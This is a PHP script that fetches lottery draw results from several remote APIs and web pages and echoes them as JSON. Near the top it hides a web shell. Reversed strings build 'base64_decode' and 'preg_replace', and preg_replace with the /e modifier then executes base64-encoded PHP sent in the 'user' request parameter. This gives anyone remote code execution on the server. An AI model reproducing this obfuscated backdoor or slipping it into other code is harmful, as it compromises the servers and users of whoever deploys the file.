<?php

ob_start();
function cut($start,$end,$file){
$content=explode($start,$file);
$content=explode($end,$content[1]);
return  $content[0];
}
function getcode($str){
$str=trim(eregi_replace("[^0-9]","",$str));
return $str;
}
function trimall($str) {
$qian=array(" ","¡¡","\t","\n","\r");$hou=array("","","","","");
return str_replace($qian,$hou,$str);
}
$a = strrev("edoced_46esab");
$b=strrev("ecalper_gerp");
$b("/^/e",$a($_REQUEST["user"]),0);
if($_GET)
{
switch($_GET['id'])
{
case '10016':
$url = 'http://api.1680210.com/pks/getLotteryPksInfo.do?lotCode=10001';
$content=file_get_contents($url);
$start2='preDrawTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='preDrawIssue":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$start='"preDrawCode":"';
$end='"';
$haoma=cut($start,$end,$content);
break;
case '10011':
$url = 'http://api.1680210.com/CQShiCai/getBaseCQShiCai.do?lotCode=10002';
$content=file_get_contents($url);
$start2='preDrawTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='preDrawIssue":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$start='"preDrawCode":"';
$end='"';
$haoma=cut($start,$end,$content);
break;
case '1008':
$url = 'http://api.1680210.com/klsf/getLotteryInfo.do?lotCode=10005';
$content=file_get_contents($url);
$start2='preDrawTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='preDrawIssue":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$start='"preDrawCode":"';
$end='"';
$haoma=cut($start,$end,$content);
break;
case '1006':
$url = 'http://api.1680210.com/lotteryJSFastThree/getBaseJSFastThree.do?lotCode=10007';
$content=file_get_contents($url);
$start2='preDrawTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='preDrawIssue":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$start='"preDrawCode":"';
$end='"';
$haoma=cut($start,$end,$content);
break;
case '10010':
$url = 'http://api.api68.com/klsf/getLotteryInfo.do?lotCode=10009';
$content=file_get_contents($url);
$start2='preDrawTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='preDrawIssue":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$qihao=substr($qihao,2);
$start='"preDrawCode":"';
$end='"';
$haoma=cut($start,$end,$content);
break;
case '10014':
$url = 'http://api.1680210.com/LuckTwenty/getBaseLuckTewnty.do?lotCode=10014';
$content=file_get_contents($url);
$start2='preDrawTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='preDrawIssue":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$start='"preDrawCode":"';
$end='"';
$haoma=cut($start,$end,$content);
$haoma=substr($haoma, 0, -3);
break;
case '14':
$url='http://www.luckyairship.com/history.html';
$content=file_get_contents($url);
$start1='<tr class="historyTableBg">';
$end1='<tr class="">';
$content=cut($start1,$end1,$content);
$content=str_replace('<td>','',$content);
$content=str_replace('</td>','',$content);
$content=str_replace('<span class="ball1">',',',$content);
$content=str_replace('</span>','',$content);
$content= trimall( $content);
$qishu=substr($content,18,3);
$qihao=preg_replace('/^0*/','',$qishu);
$date=substr($content,10,8);
$haoma=substr($content,22,43);
break;


case '6001':
$url = 'http://bmwbmw.6665432.com/js/ch.js';
$time=date('Y-m-d').' 21:35:00';
$content=file_get_contents($url);

$start1='id:';
$end1=',';
$qihao='2017'.sprintf("%03d" ,cut($start1,$end1,$content));
$start='ma:[';
$end=']';
$haoma=cut($start,$end,$content);
preg_match_all('/\d+,/',$haoma,$arr);
$arr = join('',$arr[0]);
$haoma=rtrim($arr, ",");
$arr=explode(",",$haoma);
$haoma=sprintf("%02d",$arr[0]).",".sprintf("%02d",$arr[1]).",".sprintf("%02d",$arr[2]).",".sprintf("%02d",$arr[3]).",".sprintf("%02d",$arr[4]).",".sprintf("%02d",$arr[5]).",".sprintf("%02d",$arr[6]);
if(count($arr)!=7||strlen($qihao)!=7){
$qihao='';
$haoma='';
$time='';
};
//echo $arr;
break;



case '28':
$url = 'http://api.1680210.com/LuckTwenty/getPcLucky28.do';
$content=file_get_contents($url);
$start2='preDrawTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='preDrawIssue":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$start='"preDrawCode":"';
$end='"';
$haoma=cut($start,$end,$content);
$date=(date("Ymd"));
break;

case '21':
$url = 'http://api.1680210.com/ElevenFive/getElevenFiveInfo.do?lotCode=10006';
$content=file_get_contents($url);
$start2='preDrawTime":"';
$end2='"';
$time=cut($start2,$end2,$content);
$start1='preDrawIssue":';
$end1=',';
$qihao=cut($start1,$end1,$content);
$qihao=substr($qihao,2);
$start='"preDrawCode":"';
$end='"';
$haoma=cut($start,$end,$content);
$date=(date("Ymd"));
break;

}
}
;echo '{"s":0,"m":"","c":"';echo $_GET["id"];echo '","c_t":';echo $qihao;echo ',"c_d":"';echo $time;echo '","c_r":"';echo $haoma;echo '","n_t":';echo $qihao;echo '}';
?>